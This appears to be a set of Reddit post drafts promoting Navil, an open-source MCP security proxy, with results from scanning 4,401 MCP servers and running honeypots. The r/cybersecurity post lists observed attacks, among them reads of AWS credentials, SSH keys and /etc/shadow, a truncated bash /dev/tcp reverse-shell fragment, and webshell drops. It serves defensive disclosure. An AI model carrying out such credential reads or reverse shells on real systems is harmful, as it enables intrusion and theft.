# Reddit Posts

## r/MachineLearning or r/artificial

**Title:** We scanned 4,401 MCP servers and deployed honeypots. Here's the real security picture.

**Body:**

Everyone's debating whether MCP is dead or the future. We decided to actually measure the security situation.

**The scan:** 4,401 MCP servers crawled from npm, PyPI, and awesome-mcp-servers. Only 77 (1.7%) had code-level vulnerabilities. The packages are mostly fine.

**The surprise:** Static scanning misses 98% of the real threats. Prompt injection via tool descriptions, credential theft through tool arguments, rug pull attacks — these only appear at runtime.

**The honeypot:** We deployed decoy MCP servers with tools like `read_env` and `exec_command`. Automated scanners found them within hours. They tried reading AWS credentials, SSH keys, and even attempted reverse shells.

**What we built:** Navil — an open-source proxy that sits between your AI agent and MCP servers. It watches every tool call, detects anomalies, and blocks threats. Two commands to set up:

```
pip install navil
navil wrap your_config.json
```

Works with Claude Desktop, Cursor, Continue.dev, OpenClaw. MIT licensed.

GitHub: https://github.com/navilai/navil
Live threat radar: https://navil.ai/radar

Happy to share more details about the honeypot findings or threat landscape.

---

## r/cybersecurity

**Title:** MCP (Model Context Protocol) honeypot results: automated scanners probing for credentials within hours

**Body:**

We deployed honeypot MCP servers on Oracle Cloud with realistic-looking tools (read_env, exec_command, read_file, write_file). Exposed them via Cloudflare tunnel.

Within hours of deployment:
- Tool enumeration requests (tools/list)
- Attempts to read ~/.aws/credentials, ~/.ssh/id_rsa, /etc/shadow
- Environment variable dumps with filters for API|SECRET|TOKEN
- Reverse shell attempts (bash -i >& /dev/tcp/...)
- Webshell drops (PHP system() via write_file)
- Crontab persistence via write_file

MCP is becoming an attack surface that most orgs don't even know they have. AI agents with tool access + no security boundary = the new shadow IT.

We built an open-source runtime security proxy for this: https://github.com/navilai/navil

Key data points:
- 4,401 MCP packages scanned, only 1.7% with static vulnerabilities
- 368 threat signatures covering 11 attack patterns
- 100% detection rate on our test suite
- Community threat intelligence network (anonymous sharing)

Interested in the honeypot data? We're publishing it on our public radar: https://navil.ai/radar

---

## r/netsec

**Title:** Open-source MCP honeypot + security proxy: results from scanning 4,401 servers and deploying traps

Short post linking to the blog post + GitHub.
